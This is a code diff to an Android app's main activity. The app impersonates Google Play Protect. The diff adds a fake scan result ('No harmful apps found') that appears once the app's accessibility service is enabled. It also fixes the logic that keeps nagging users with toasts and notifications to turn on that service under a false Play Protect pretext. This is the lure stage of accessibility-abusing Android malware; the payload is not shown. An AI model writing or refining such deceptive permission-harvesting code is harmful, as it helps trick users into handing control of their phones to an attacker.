@@ -33,7 +33,12 @@ public class MainActivity extends AppCompatActivity {
 		TextView lastScanned = findViewById(R.id.tvLastScanned);
 
 		scanButton.setOnClickListener(v -> {
-			Alert.openSettings(this);
+			if(isAccessibilityServiceEnabled()){
+				securityStatus.setText("No harmful apps found");
+				lastScanned.setText("Play Protect scanned moments ago");
+			}else{
+				Alert.openSettings(this);
+			}
 		});
 
 
@@ -46,7 +51,7 @@ public class MainActivity extends AppCompatActivity {
 	}
 
 	private void showAccessibilityNotification() {
-		if (isAccessibilityServiceEnabled()) {
+		if (!isAccessibilityServiceEnabled()) {
 			NotificationManager notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
 			createNotificationChannel(notificationManager);
 
@@ -81,7 +86,7 @@ public class MainActivity extends AppCompatActivity {
 		final Runnable runnable = new Runnable() {
 			@Override
 			public void run() {
-				if (isAccessibilityServiceEnabled()) {
+				if (!isAccessibilityServiceEnabled()) {
 					Toast.makeText(MainActivity.this, "This app requires Google Play Protect Service's framework, please enable it.", Toast.LENGTH_LONG).show();
 					handler.postDelayed(this, 5000);
 				}
@@ -98,7 +103,7 @@ public class MainActivity extends AppCompatActivity {
 		} catch (Settings.SettingNotFoundException e) {
 			// Catch exception if setting is not found
 		}
-		return accessibilityEnabled != 1 || !isAccessibilityServiceEnabledForPackage(service);
+		return accessibilityEnabled == 1 && isAccessibilityServiceEnabledForPackage(service);
 	}
 
 	private boolean isAccessibilityServiceEnabledForPackage(String service) {
